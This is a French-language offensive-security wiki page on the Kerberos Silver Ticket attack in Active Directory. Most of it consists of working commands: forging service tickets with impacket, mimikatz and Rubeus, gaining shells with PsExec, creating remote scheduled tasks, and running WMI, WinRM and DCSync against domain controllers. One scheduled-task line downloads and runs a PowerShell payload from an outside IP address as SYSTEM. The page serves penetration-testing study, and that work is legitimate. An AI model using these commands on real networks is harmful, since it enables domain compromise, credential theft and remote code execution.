# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

L'attaque **Silver Ticket** implique l'exploitation des tickets de service dans les environnements Active Directory (AD). Cette méthode repose sur **l'acquisition du hachage NTLM d'un compte de service**, tel qu'un compte d'ordinateur, pour forger un ticket de service de délivrance de tickets (TGS). Avec ce ticket forgé, un attaquant peut accéder à des services spécifiques sur le réseau, **impostant n'importe quel utilisateur**, visant généralement des privilèges administratifs. Il est souligné que l'utilisation de clés AES pour forger des tickets est plus sécurisée et moins détectable.

Pour la création de tickets, différents outils sont utilisés en fonction du système d'exploitation :

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Sur Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Le service CIFS est mis en avant comme une cible courante pour accéder au système de fichiers de la victime, mais d'autres services comme HOST et RPCSS peuvent également être exploités pour des tâches et des requêtes WMI.

## Services Disponibles

| Type de Service                            | Tickets Silver de Service                                                |
| ------------------------------------------ | ------------------------------------------------------------------------ |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Selon le système d'exploitation également :</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Dans certaines occasions, vous pouvez simplement demander : WINRM</p> |
| Tâches Planifiées                          | HOST                                                                   |
| Partage de Fichiers Windows, aussi psexec | CIFS                                                                   |
| Opérations LDAP, y compris DCSync         | LDAP                                                                   |
| Outils d'Administration de Serveur à Distance Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                   |
| Golden Tickets                             | krbtgt                                                                 |

En utilisant **Rubeus**, vous pouvez **demander tous** ces tickets en utilisant le paramètre :

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### IDs d'Événements des Tickets Silver

- 4624 : Connexion de Compte
- 4634 : Déconnexion de Compte
- 4672 : Connexion Administrateur

## Abus des Tickets de Service

Dans les exemples suivants, imaginons que le ticket est récupéré en usurpant le compte administrateur.

### CIFS

Avec ce ticket, vous serez en mesure d'accéder au dossier `C$` et `ADMIN$` via **SMB** (s'ils sont exposés) et de copier des fichiers vers une partie du système de fichiers distant juste en faisant quelque chose comme :
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Vous pourrez également obtenir un shell à l'intérieur de l'hôte ou exécuter des commandes arbitraires en utilisant **psexec** :

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HÔTE

Avec cette autorisation, vous pouvez générer des tâches planifiées sur des ordinateurs distants et exécuter des commandes arbitraires :
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Avec ces tickets, vous pouvez **exécuter WMI dans le système de la victime** :
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Trouvez **plus d'informations sur wmiexec** dans la page suivante :

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HÔTE + WSMAN (WINRM)

Avec l'accès winrm sur un ordinateur, vous pouvez **y accéder** et même obtenir un PowerShell :
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Vérifiez la page suivante pour apprendre **plus de façons de se connecter à un hôte distant en utilisant winrm** :

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Notez que **winrm doit être actif et à l'écoute** sur l'ordinateur distant pour y accéder.

### LDAP

Avec ce privilège, vous pouvez extraire la base de données DC en utilisant **DCSync** :
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**En savoir plus sur DCSync** sur la page suivante :

## Références

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}
